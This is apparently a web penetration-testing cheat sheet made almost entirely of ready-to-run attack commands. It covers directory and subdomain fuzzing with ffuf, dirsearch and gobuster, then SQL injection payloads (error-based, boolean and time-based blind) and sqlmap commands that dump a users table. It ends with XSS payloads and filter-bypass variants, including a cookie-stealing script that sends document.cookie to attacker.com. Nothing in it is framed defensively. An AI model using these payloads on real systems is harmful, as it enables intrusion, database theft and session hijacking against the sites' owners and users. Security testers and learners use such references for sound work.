🔎 Reconnaissance

Directory & File Enumeration 
# ffuf - fast web fuzzer
ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302,403

# Dirsearch
dirsearch -u https://target.com -e php,html,js -t 50

# Gobuster
gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,html,txt,bak
Subdomain Enumeration 
# ffuf subdomain fuzzing
ffuf -u http://FUZZ.target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200

# Manual DNS lookup
nslookup target.com
dig target.com ANY

💉 SQL Injection

Manual Detection Web 
# Basic error-based test
'
''
`
1' OR '1'='1
1' OR '1'='1'--
1' OR '1'='1'/*

# Boolean-based blind
1' AND 1=1--   # True - page loads normally
1' AND 1=2--   # False - page changes

# Time-based blind
1' AND SLEEP(5)--
1'; WAITFOR DELAY '0:0:5'--   # MSSQL
SQLMap Automation 
# Basic scan on GET parameter
sqlmap -u "http://target.com/page?id=1" --dbs

# POST request
sqlmap -u "http://target.com/login" --data="user=admin&pass=test" --dbs

# Dump specific database
sqlmap -u "http://target.com/page?id=1" -D dbname --tables
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump

# Use saved Burp request
sqlmap -r request.txt --dbs --level=3 --risk=2

⚡ Cross-Site Scripting (XSS)

Basic XSS Payloads 
# Reflected XSS test
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(document.domain)</script>

# Cookie stealing payload
<script>document.location='http://attacker.com/?c='+document.cookie</script>

# XSS via JavaScript URI
javascript:alert(document.cookie)
Filter Bypass Techniques Web 
# Mixed case bypass
<ScRiPt>alert(1)</ScRiPt>

# Encoded payloads
<img src=x onerror=alert(1)>

# Without parentheses
<img src=x onerror=alert`1`>

# Double encoding
%253Cscript%253Ealert(1)%253C/script%253E
